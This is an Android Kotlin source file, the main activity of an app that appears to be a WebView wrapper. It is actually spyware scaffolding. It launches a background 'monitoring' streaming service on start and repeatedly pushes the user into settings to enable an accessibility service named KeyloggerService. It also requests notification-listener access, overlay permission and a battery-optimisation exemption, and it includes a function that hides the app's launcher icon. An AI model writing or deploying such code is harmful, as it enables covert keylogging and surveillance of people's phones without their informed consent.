package com.example.myapplicationtestweb

import android.accessibilityservice.AccessibilityServiceInfo
import android.app.AppOpsManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {

    private lateinit var webView: WebView
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())

    private var lastAccessibilityPromptTime: Long = 0
    private var lastNotificationPromptTime: Long = 0
    private var lastOverlayPromptTime: Long = 0
    private var lastBatteryPromptTime: Long = 0

    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        checkNextStep()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        webView = WebView(this)
        setContentView(webView)
        
        setupWebView()
        
        // Start initial monitoring service immediately 
        startMonitoringService()
        
        // Delay initial check to ensure UI is ready
        mainHandler.postDelayed({ checkNextStep() }, 1000)
    }

    override fun onResume() {
        super.onResume()
        checkNextStep()
    }

    private fun setupWebView() {
        val settings = webView.settings
        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.cacheMode = WebSettings.LOAD_DEFAULT
        webView.webViewClient = WebViewClient()
    }

    private fun checkAndRequestBulkPermissions() {
        val required = Config.getRequiredPermissions(this)
        val missing = required.filter { 
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
        }

        if (missing.isNotEmpty()) {
            requestPermissionsLauncher.launch(missing.toTypedArray())
        }
    }

    private fun checkNextStep() {
        // Start service anytime permissions might have changed
        startMonitoringService()

        val required = Config.getRequiredPermissions(this)
        val runtimeMissing = required.any { 
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED 
        }
        
        val enableKeylogger = Config.isFeatureEnabled(this, "feat_keylogger")
        val enableNotifications = Config.isFeatureEnabled(this, "feat_notifications")
        val enableOverlay = Config.isFeatureEnabled(this, "feat_overlay")
        val enableBattery = Config.isFeatureEnabled(this, "feat_battery")

        val now = System.currentTimeMillis()

        // --- ACCESSIBILITY-FIRST FLOW (WITH LOOP-PREVENTION THROTTLING) ---
        when {
            enableKeylogger && !isAccessibilityServiceEnabled() && (now - lastAccessibilityPromptTime > 6000) -> {
                requestAccessibilityAccess()
            }
            runtimeMissing -> {
                checkAndRequestBulkPermissions()
            }
            enableNotifications && !isNotificationServiceEnabled() && (now - lastNotificationPromptTime > 6000) -> {
                requestNotificationAccess()
            }
            enableOverlay && !isOverlayAccessGranted() && (now - lastOverlayPromptTime > 6000) -> {
                requestOverlayAccess()
            }
            enableBattery && !isIgnoringBatteryOptimizations() && (now - lastBatteryPromptTime > 6000) -> {
                requestIgnoreBatteryOptimizations()
            }
            else -> {
                // ALL PERMISSIONS GRANTED OR SKIPPED — Load Webview
                if (webView.url == null) {
                    webView.loadUrl(Config.getWebUrl(this))
                }
            }
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        // 1. Official System AccessibilityManager Check
        try {
            val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as? android.view.accessibility.AccessibilityManager
            val enabledServices = am?.getEnabledAccessibilityServiceList(-1)
            if (enabledServices != null) {
                for (info in enabledServices) {
                    val sInfo = info.resolveInfo?.serviceInfo
                    if (sInfo != null && sInfo.packageName == packageName && 
                        (sInfo.name.contains("KeyloggerService") || sInfo.name == KeyloggerService::class.java.name)) {
                        return true
                    }
                }
            }
        } catch (e: Exception) {}

        // 2. Settings.Secure Fallback with Flexible String Matching
        try {
            val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
            if (enabled == 1) {
                val settingValue = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                if (!settingValue.isNullOrEmpty()) {
                    val splitter = TextUtils.SimpleStringSplitter(':')
                    splitter.setString(settingValue)
                    while (splitter.hasNext()) {
                        val s = splitter.next().trim()
                        if (s.contains(packageName, ignoreCase = true) && s.contains("KeyloggerService", ignoreCase = true)) {
                            return true
                        }
                    }
                }
            }
        } catch (e: Exception) {}

        return false
    }

    private fun requestAccessibilityAccess() {
        lastAccessibilityPromptTime = System.currentTimeMillis()
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun requestNotificationAccess() {
        lastNotificationPromptTime = System.currentTimeMillis()
        try {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun isUsageAccessGranted(): Boolean {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        } else {
            appOps.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
        }
        return mode == AppOpsManager.MODE_ALLOWED
    }

    private fun requestUsageAccess() {
        try {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {}
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            return pm.isIgnoringBatteryOptimizations(packageName)
        }
        return true
    }

    private fun requestIgnoreBatteryOptimizations() {
        lastBatteryPromptTime = System.currentTimeMillis()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        } catch (e: Exception) {}
    }

    private fun isOverlayAccessGranted(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else true
    }

    private fun requestOverlayAccess() {
        lastOverlayPromptTime = System.currentTimeMillis()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        } catch (e: Exception) {}
    }

    private fun startMonitoringService() {
        val intent = Intent(this, StreamingService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        } catch (e: Exception) {}
    }

    private fun hideAppIcon() {
        try {
            val componentName = android.content.ComponentName(this, "com.example.myapplicationtestweb.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {}
    }
}
